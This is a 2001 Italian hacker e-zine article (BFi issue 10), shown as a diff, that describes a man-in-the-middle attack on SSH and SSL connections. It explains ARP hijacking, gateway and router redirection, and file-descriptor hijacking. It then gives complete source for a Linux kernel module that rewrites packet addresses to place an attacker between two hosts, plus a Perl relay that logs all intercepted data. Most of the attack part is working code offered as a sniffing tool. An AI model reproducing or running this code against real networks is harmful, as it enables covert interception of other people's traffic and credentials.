@@ -1,0 +1,467 @@
+==============================================================================
+-----------[ BFi numero 10, anno 4 - 30/09/2001 - file 11 di 18 ]-------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ 0TU: SiSTEMA EV0LUT0 Di MiTM
+-----[ vecna <vecna@s0ftpj.org>
+
+
+526.vecna :~/wrk/my/otu$ cat README.it
+
+------ OTU -----              ---------- concetto evoluto di man in the middle
+vecna@s0ftpj.org              ---------- http://www.s0ftpj.org ------ 9/7/2001
+
+il nome intero sarebbe: icarofsmitmawkh, che significa:
+"Idea Code And Readme For Simple Main In The Middle Attack With Kernel Hack",
+
+sottotitolo:
+"come far un SSL sniffer con meno di 200 linee di codice"
+
+semplificato verra` chiamato: OTU, ottenuto da porcherie matematiche applicate
+al nome.
+
+1 -] com'e` iniziata la sua esistenza
+
+come gia` risaputo dalla creazione dei protocolli, SSL e SSH si basano su
+un sistema di scambio di chiavi pubbliche che poi verranno utilizzate per
+decidere la chiave privata con la quale portare avanti la connessione.
+
+questo mette al riparo da tutti gli attacchi di sniffing passivo, ma non
+completamente da quegli attacchi detti di "man in the middle" che richiedono
+una partecipazione attiva (in termini di pacchetti) da parte del tizio curioso
+sulla rete.
+
+dsniff al suo tempo, implemento` un sistema di man in the middle necessario x
+sniffare SSH e SSL, ettercap pure.
+
+che succede quindi? mediante arp hijacking ci si mette al posto dell'host
+che instaura la comunicazione e si "proxa" la connessione, ovvero, la roba
+che e` destinata all'host della nostra subnet ce la prendiamo noi, noi
+instauriamo una connessione con l'altro peer spoofandoci per il tizio nella
+nostra lan (a cui stiamo fottendo i pacchetti) e con l'host sfigato della
+subnet facciamo partire una connessione ssh tra noi e lui, ma spoofando i
+nostri pkt in modo che sembrino provenienti dal peer remoto.
+
+nella fattispecie ettercap e` un po' + fine di dsniff almeno x quanto riguarda
+SSH xke` anziche` proxare tutta la comunicazione si intromette solo quando c'e`
+lo scambio di chiavi pubbliche e private, dopodiche` continua come spettatore
+e basta.
+
+qual'e` il problema e il limite di questi 2 strumenti?
+
+c'e` da programmare troppo, bisogna praticamente ricostruire tutto da layer 2
+a layer 4 o +, quando invece abbiamo dei software belli, ma proprio belli che
+farebbero proprio al caso nostro per quanto sono fighi, solo che si appoggiano
+al kernel e a un sistema di comunicazione standard. sto parlando di sshd
+stunnel apache sendmail telnetd e tutta 'sta caterva di demoni bucati o no che
+rendono + felice la vita di ogni amministratore di sistema.
+
+quindi vista la mia totale dedizione verso la programmazione kernel ho
+partorito dopo una gestazione di kernel panic un modulo che si preoccupi di
+intercettare certi pacchetti entranti in modo da riferirli a socket locali,
+interfacciabili ai software che gia` abbiamo.
+
+logicamente i pacchetti entranti che ci interesseranno non saranno i nostri :)
+tra l'altro questo approcio di mitm non implica l'ausilio di un particolare
+sistema di dirottamento che ci renda "terzi incomodi", OGNI punto di una
+trasmissione puo` essere un appoggio utilizzabile per un dirottamento,
+precisamente:
+
+- in LAN, con arp hijacking e` possibile intrometterci, sia in una rete
+  gestita da un hub sia in una gestita da uno switch (non in tutti tutti i
+  casi), sostanzialmente con le solite tecniche, utilizzabili mediante un
+  packet forger che supporti l'arp e sia abbastanza completo, il tutto
+  controllato da uno scriptino.
+- sul GW, semplicemente caricando il modulo, visto che di suo i pacchetti
+  altrui ci passano attraverso
+- su un router intermedio, viste le tecniche di dirottamento mediante tunnel
+  GRE o altri tunnel e` possibile dirottare certi flussi di dati verso un
+  altro host (noi), fargli far mitm e far tornar la roba verso il leggitimo
+  destinatario.
+  per completare questo attacco sara` necessario prevedere il modulo in modo
+  che se riceva pacchetti incapsulati li decapsuli e poi li ripassi alla
+  funzione di controllo, e nel caso i pacchetti in uscita siano quelli da
+  riencapsulare, lo faccia.
+  e` sostanzialmente semplice, per maggiori informazioni ci si puo riferire
+  alla kernel api guide sezione networking e al codice di ipip e gre.
+- mi sembra scontato, ma vabe`: sull'host che stiamo attaccando (se ci si
+  pensa per 3 secondi ci si accorge che sniffare qui xo` e` inutile, a parita`
+  di condizioni si puo far di +, in particolare mediante tty sniffing, tty
+  hijacking o in situazioni di port forwarding mediante local socket sniffing
+  in kernel space).
+  (local socket sniffing non e` una cosa conosciuta, ma e` intuitivamente
+  comprensibile che si possa sniffare in una situazione del genere il
+  traffico controllando le chiamate bind() listen() accept() per individuare
+  i socket del demone interessato, a quel punto ci si trova davanti a una
+  normale situazione di file descriptor hijacking descritta in un numero di
+  phrack (con implementazione completamente diversa xo`) questo riguarda sia
+  protocolli in chiaro che crittati (xke` una volta individuato il socket 
+  basta risalire al processo e al fd di quel processo e leggere STD*_FILENO).
+
+2 -] funzionamento spicciolo
+
+il modulo funziona monitorando 2 host e diventando un mitm per ogni
+connessione che c'e` tra i 2 host; per far un attacco mirato ad un solo
+servizio basta aggiungere un controllo tra i pacchetti selezionati in modo che
+venga controllato il numero di porta sorgente/destinazione.
+
+normalmente per il kernel 2.4 mi sono trovato a lavorare con gli hook di
+netfilter, ed e` una cosa molto molto comoda nella maggioranza dei casi, ma
+non in questa.
+per accedere a un layer cosi` basso per poter manipolare pacchetti in entrata
+e in uscita, potendo ancora cambiare la loro destinazione (con NF non sarebbe
+potuto andare xke` in alcuni casi i pkt che andrebbero nell'hook di forward o
+trattati come PACKET_OTHERHOST cmq, non possono essere riindirizzati con 
+quelli del local input), ho utilizzato il vecchio sistema del 2.2 della
+packet_type e dell'aggiunta di una funzione.
+
+che succede allora, scenario:
+
+                     A <--------->\     /<---------> B
+                                  |     |
+                                  |     |
+                                  \- C -/
+
+quando becchiamo un pacchetto che da A va a B lo rendiamo con destinazione C,
+cosi` facendo viene accettato ai layer superiori, vien poi generata una
+risposta da C a A, ma questa risposta dovrebbe provenire da B, quindi quando
+si vede un pkt con sorgente C e destinazione A o B si cambia il sorgente con
+quello che non e` la destinazione (tra A e B), quando si vede un pacchetto con
+sorgente o A o B si cambia la destinazione con C.
+
+umh ... chi..chi... chiaro :) ?
+
+ai layer superiori sta` un datapipe apposta, in modo trasparente noi siamo in
+mezzo a 2 comunicazioni con un modulo da 150 linee circa e un sistema in
+userspace dalle 20 alle 100 linee a seconda del linguaggio usato...
+
+<-| otu/otu.c |->
+/*
+ * vecna@s0ftpj.org - http://www.s0ftpj.org 
+ * OTU - advanced tool for man in the middle, for more info read README
+ * file from our site under tools page
+ *
+ * 9/31 7/12 2001/infinite
+ *
+ */
+#define __KERNEL__
+#define MODULE
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/socket.h>
+#include <linux/net.h>
+#include <linux/in.h>
+#include <linux/ip.h>
+#include <linux/netdevice.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/skbuff.h>
+#include <linux/version.h>
+#include <linux/brlock.h>
+#include <linux/file.h>
+
+#include <net/tcp.h>
+
+static void tcpudp_csum(struct sk_buff *, unsigned int, unsigned int );
+static unsigned int inet_addr(char *);
+
+static struct packet_type lrd;
+
+static char *host1, *host2, *mitm;
+static unsigned int p1, p2, local_addr;
+MODULE_PARM(host1, "s");
+MODULE_PARM(host2, "s");
+MODULE_PARM(mitm, "s");
+
+/* -- *
+ * packets with source 2|1 and dest 1|2 change dest with MITM.
+ * packets with source MITM and dest 1|2 change source with opposite of dest
+ * -- *
+ * on this module coded for 2.4 kernel I use struct packet_type.func injecton
+ * than hook options feature of netfilter, this because with one function I
+ * can read any packet at datalink layer ad check PACKET_OTHERHOST and 
+ * PACKET_HOST and PACKET_OUTGOING more easy.
+ * this is less performantic but can't to be a big problem :P
+ * -- */
+
+static int redir(struct sk_buff *skb, 
+		 struct net_device *dev, 
+		 struct packet_type *pt)
+	{
+	unsigned int osaddr =skb->nh.iph->saddr;
+	unsigned int odaddr =skb->nh.iph->daddr;
+
+	unsigned int *src_ip =&skb->nh.iph->saddr;
+	unsigned int *dst_ip =&skb->nh.iph->daddr;
+
+	if(skb->nh.iph->protocol !=IPPROTO_TCP)
+		goto end;
+
+	if(*src_ip ==local_addr && (*dst_ip ==p2 || *dst_ip ==p1))
+		{
+		*src_ip =(*dst_ip ==p2) ? p1 : p2;
+		goto checksum;
+		}
+
+	if((*src_ip ==p1 && *dst_ip ==p2) || (*dst_ip ==p1 && *src_ip ==p2))
+		*dst_ip =local_addr;
+
+checksum:
+	skb->nh.iph->check =0x0000;
+	ip_send_check(skb->nh.iph);
+
+	tcpudp_csum(skb, osaddr, odaddr);
+
+end:
+	kfree_skb(skb);
+	return(0);
+	}
+
+void tcpudp_csum(struct sk_buff *x, unsigned int osaddr, unsigned int odaddr)
+	{
+	struct iphdr *iph =x->nh.iph;
+	unsigned short check =0x0000;
+	unsigned short *cksum;
+
+	cksum  =(unsigned short *)&((struct tcphdr *)
+		(((char *)iph) +(iph->ihl<<2)))->check;
+	check  =csum_tcpudp_magic(iph->saddr, iph->daddr, 0, IPPROTO_TCP, 
+		~(*cksum));
+	*cksum =csum_tcpudp_magic(~osaddr, ~odaddr, 0, 0, ~check);
+	*cksum +=htons(IPPROTO_TCP);
+	}
+
+init_module(void)
+	{
+	/* setting hook struct */
+
+	if((host1 ==NULL && host2 ==NULL) || mitm ==NULL)
+		{
+		printk(KERN_ERR "insmod lshjk.o host1=foo.com host2=wow2.net"
+				" mitm=myip.it\n");
+		return -EDESTADDRREQ;
+		}
+
+	p1 =(host1 !=NULL) ? inet_addr(host1) : 0;
+	p2 =(host2 !=NULL) ? inet_addr(host2) : 0;
+
+	local_addr =inet_addr(mitm);
+
+	lrd.type =htons(ETH_P_ALL);
+	lrd.func =redir;
+	lrd.dev =NULL;
+
+	dev_add_pack(&lrd);
+
+	printk(KERN_INFO "otu - vecna@s0ftpj.org\n");
+
+	return 0;
+	}
+
+void cleanup_module(void)
+	{
+	dev_remove_pack(&lrd);
+
+	printk(KERN_INFO "otu unloaded\n");
+	}
+
+unsigned int inet_addr(char *str) 
+	{
+	unsigned long l;
+	unsigned int val;
+	int i;
+
+	l = 0;
+	for (i =0; i < 4; i++)
+		{
+		l <<= 8;
+		if(*str !='\0')
+			{
+			val = 0;
+			while (*str != '\0' && *str != '.')
+				{
+				val *= 10;
+				val += *str - '0';
+				str++;
+				}
+
+			l |= val;
+			if (*str != '\0')
+				str++;
+			}
+		}
+
+	return(htonl(l));
+	}
+<-X->
+
+3 -] nota sui protocolli sicuri SSH, SSL, SRP
+
+han gia` previsto questa evenienza: i sistemi seri con admin un pochino furbi
+se vedranno che misteriosamente il server gli offre una chiave diversa
+difficilmente accetteranno, magari vedendo il banner "possibile dns spoofing"
+proveranno a inserire l'ip numerico della loro macchina... ma senza accettare
+la key offerta credo.
+
+la stessa cosa vale per ogni certificato SSL gia` presente sulle macchine, se
+un utente li controlla non ci sono speranze, senza contare la verifica che puo
+essere portata ai certificati x.509 mediante verysign.
+
+non significa che e` inutile contro SSL, anzi, tutte le connessioni che
+avvengono x la prima volta si prendono il nostro certificato, visto che si e`
+mitm si potrebbe anche cambiare il web annunciando che i certificati sono
+cambiati e blablabla... (questo almeno x https)
+
+per quanto riguarda SRP o altri possibili sistemi di autenticazione...
+finche` non verra` implementato un sistema di autenticazione a livello di
+rete, come ipsec (anche se si puo fare molto di meglio :) non c'e` sistema
+di scambio di chiavi che tenga, e` una questione di layer.
+
+4 -] 2 paroline su mitm.pl
+
+l'autrice di questo programma non sono io, ma ya.
+
+il suo sito e` http://yawna.free.fr, usate il suo client irc in perl/tk 
+yairc :)
+(fine spot - te lo dovevo)
+
+uso: <./mitm "un netcat" "un altro netcat">, uno in listening sul servizio che
+mitmiddoliamo e l'altro verso il servizio vero, se non con netcat con stunnel,
+o con nc + stunnel, o con un server o con un client fatto da voi, e` un
+datapipe e nulla +, legge l'output da un processo e lo mette nell'altro,
+bidirezionalmente.
+
+tutti i dati che passano vengono loggati in append in log.txt
+
+<-| otu/mitm.pl |->
+
+#!/usr/bin/perl -w
+
+use strict;
+use FileHandle;
+use IPC::Open2;
+use IO::Select;
+use Symbol;
+
+
+$SIG{PIPE} = "IGNORE";
+
+my($arg1,$arg2) = @ARGV;
+my($r1,$w1,$r2,$w2) = (gensym,gensym,gensym,gensym);
+
+my $pid1 = open2($r1, $w1, $arg1 );
+my $pid2 = open2($r2, $w2, $arg2 );
+
+my $old=select($w1);
+$|=1;
+select($w2);
+$|=1;
+select($old);
+
+open(LOG,">>log.txt") || die("open: $!");
+$old=select(LOG);
+$|=1;
+select($old);
+
+my $s = IO::Select->new();
+$s->add($r1);
+$s->add($r2);
+
+
+my %map = ( $r1 => $w2, $r2 => $w1 );
+
+while(1) {
+	
+while(my @ready = $s->can_read) {	
+	
+	for my $f (@ready) {
+		ready($f);
+	}
+}
+die "select: $!" if $!;
+}
+
+
+sub ready {
+	
+	my ($pipe,$len) = shift;
+	
+	print "pipe: ",fileno($pipe);
+	check( $pipe, $len = sysread($pipe,my $data,1024) );
+
+	if($len) {
+		print LOG $data;
+		my $peer = $map{$pipe};
+		check( $peer, $len = syswrite($peer,$data)  );
+	}
+}
+
+
+sub check {
+	my $p = shift;
+	my $len = shift;
+	if(!defined $len) {
+		print "error";
+		$s->remove($p);
+		close($p);
+	}
+	elsif($len==0) {
+		print "eof";
+		$s->remove($p);
+		close($p);
+	}
+}
+<-X->
+
+5 -] Start -> Programmi -> Utilita` di sistema
+
+questo sw avrei voluto pubblicarlo come un tools abbastanza pericoloso con
+tanto di spiegazioni su come far le dirottazioni, esempi d'utilizzo, sistema
+di pipe interfacciato a stunnel.
+quando l'ho iniziato a programmare ero decisamente incazzato, speravo di finir
+sto sw in pochi giorni e poi pubblicarlo su ogni posto pur di garantire una
+breve diffusione e un assalto all'ssl. un barlume di buon senso, un po' di non
+voglia di menarsela con i certificati di stunnel e un suggerimento adeguato
+(quello che non e` troppo intelligente sottostare a una ghiandola quale
+l'ipotalamo :) e ho lasciato perdere.
+d'altro canto, i sentimenti sono come una connessione TCP, anche loro mutano
+di stato.
+
+	sorvolando tutte le specifiche RFC blabla xke` tanto non le ho lette,
+	http://members.nbci.com/_XMCM/faenzi/tesi/html/il_protocollo_ssl.htm
+
+	http://netfilter.samba.org
+
+	http://www.s0ftpj.org mio precedente progetto "drang" da cui mi sono
+	rippato le routine di checksum che per far correttamente ho impiegato
+	almeno 5 giorni - cazzo - e tutto x un +=htons(IPPROTO_TCP) ...
+
+	TMC2 EXCEL SAGA, martedi` 21:30, questo si che e` un sorgente di
+	entropia :) da utilizzare con "Connemara", Magenta (MI), martedi`
+	birra meta` prezzo.
+
+questo sw e` distribuito sotto licenza GPL2 + una piccola restrizione, ovvero
+se questo codice o i riferimenti sopra indicati vi saranno in qualche modo
+utili il vostro kernel cerebrale si sentira` in dovere di offrirmi una birra,
+poi sta a voi ignorarlo o no, ma questa e` la licenza e ogni derivato da
+questo software propaghera` questo dettaglio finalizzato a incrementare
+l'alcool tra i coders.
+
+<-| otu/Makefile |->
+
+all:	otu.o
+
+otu.o: otu.c
+	gcc -c -O6 -fomit-frame-pointer otu.c -I/usr/src/linux/include
+
+clean:
+	rm -rf otu.o
+<-X->
+
+
+==============================================================================
+--------------------------------[ EOF 11/18 ]---------------------------------
+==============================================================================
